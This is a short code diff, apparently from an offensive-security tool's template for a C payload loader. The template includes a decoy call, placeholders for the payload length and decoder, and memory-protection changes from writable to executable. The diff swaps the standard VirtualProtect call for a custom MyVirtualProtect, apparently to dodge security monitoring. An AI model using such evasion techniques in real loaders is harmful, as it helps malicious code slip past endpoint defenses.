@@ -39,13 +39,13 @@ int main()
 	// Call: Decoy plugin
 	decoy();
 
-    if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RW, &result) == 0) {
+    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RW, &result) == 0) {
         return 16;
     }
 
 {{ plugin_decoder }}
 
-    if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
+    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
         return 16;
     }
 
